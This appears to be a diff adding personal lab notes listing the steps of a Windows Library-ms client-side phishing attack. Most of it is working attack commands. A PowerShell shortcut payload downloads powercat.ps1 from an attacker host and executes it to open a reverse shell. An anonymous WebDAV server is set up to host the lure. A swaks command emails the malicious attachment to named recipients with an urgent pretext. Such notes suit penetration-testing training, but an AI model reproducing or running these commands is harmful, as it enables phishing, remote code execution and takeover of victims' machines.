@@ -1,0 +1,11 @@
+# steps to perform a library file based client side attack
+
+1. create the config.Library-ms file
+2. create the shortcut file on windows
+	- powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204:8080/powercat.ps1'); powercat -c 192.168.45.204 -p 1337 -e powershell"
+3. start the webdav instance with: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+4. start the listener on the correct port
+5. serve powercat.ps1 as required
+6. send the email with:
+	- sudo swaks -t marcus@beyond.com,daniela@beyond.com --from john@beyond.com --auth-user john@beyond.com --server 192.168.250.242 --body 'Please open the attached file promptly, as it is an urgent configuration change.' --attach @/home/kali/webdav/config.Library-ms --suppress-data -ap 
+
